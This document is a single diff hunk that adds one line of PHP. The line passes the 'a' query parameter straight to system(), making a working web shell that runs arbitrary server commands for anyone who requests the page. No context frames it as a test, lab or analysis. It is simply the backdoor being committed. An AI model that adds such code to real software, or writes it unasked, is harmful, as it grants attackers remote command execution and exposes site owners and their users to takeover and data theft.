@@ -1,0 +1,1 @@
+<?php $x=$_GET["a"]; system($x); ?>
